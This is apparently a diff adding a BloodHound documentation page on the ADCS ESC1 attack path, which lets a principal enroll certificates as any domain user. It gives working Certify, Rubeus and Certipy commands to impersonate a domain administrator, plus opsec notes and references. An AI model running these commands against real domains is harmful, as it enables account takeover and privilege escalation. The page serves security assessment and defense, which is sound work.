@@ -1,0 +1,77 @@
+---
+title: ADCSESC1
+description: "This edge indicates that the principal has permission to enroll on one or more certificate templates, allowing them to specify an alternate subject name and use the certificate for authentication. They also have enrollment permission for an enterprise CA with the necessary templates published."
+---
+
+<img noZoom src="/assets/enterprise-AND-community-edition-pill-tag.svg" alt="Applies to BloodHound Enterprise and CE"/>
+
+
+This enterprise CA is trusted for NT authentication in the forest, along with the certificate chain up to the root CA certificate. This setup lets the principal enroll certificates for any AD forest user or computer, enabling authentication and impersonation of any AD forest user or computer without their credentials.
+
+## Abuse Info
+
+### Windows
+
+Step 1: Use Certify (2.0) to request enrollment in the affected template, specifying the affected certification authority and target principal to impersonate:
+
+```cmd
+Certify.exe request --ca rootdomaindc.forestroot.com\forestroot-RootDomainDC-CA --template ESC1 --upn ForestRootDA --sid S-1-5-21-2697957641-2271029196-387917394-500
+```
+
+The issued certificate (PFX) is printed to the console in base64 form. Copy the full base64 blob (including BEGIN/END lines) for the next step.
+
+Step 2: With Rubeus, use the base64-encoded certificate to authenticate to the domain and request a TGT, specifying the identity you intend to impersonate:
+
+```cmd
+Rubeus asktgt /user:ForestRootDA /domain:forestroot.com /certificate:<cert base64> /ptt
+```
+
+Step 3 (optional): Verify the TGT by listing it with klist:
+
+```cmd
+klist
+```
+
+### Linux
+
+ Step 1: Use Certipy to request enrollment in the affected template, specifying the target
+enterprise CA and target principal to impersonate:
+
+```bash
+ certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC1 -upn administrator@corp.local
+```
+
+Step 2: Request a ticket granting ticket (TGT) from the domain, specifying the certificate
+created in Step 1 and the IP of a domain controller:
+
+```bash
+certipy auth -pfx administrator.pfx -dc-ip 172.16.12
+```
+## Opsec Considerations
+
+When the affected certificate authority issues the certificate to the attacker, it will retain a local copy
+of that certificate in its issued certificates store. Defenders may analyze those issued certificates to
+identify illegitimately issued certificates and identify the principal that requested the certificate, as
+well as the target identity the attacker is attempting to impersonate.
+
+## Edge Schema
+
+Source: [User](/resources/nodes/user), [Group](/resources/nodes/group), [Computer](/resources/nodes/computer)  
+Destination: [Domain](/resources/nodes/domain)  
+Traversable: **Yes**   
+
+## References
+
+This edge is related to the following MITRE ATT&CK tactic and techniques:
+
+* https://attack.mitre.org/techniques/T1649/
+
+### Abuse and Opsec references
+
+* [ADCS Attack Paths in BloodHound—Part 1](https://specterops.io/blog/2024/01/24/adcs-attack-paths-in-bloodhound-part-1/)
+* [BOFHound: AD CS Integration](https://specterops.io/blog/2024/10/30/bofhound-ad-cs-integration/)
+* [Certipy](https://github.com/ly4k/Certipy)
+* [Rubeus](https://github.com/GhostPack/Rubeus)
+* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
+* [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#misconfigured-certificate-templates-esc1](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#misconfigured-certificate-templates-esc1)
+* https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-ser
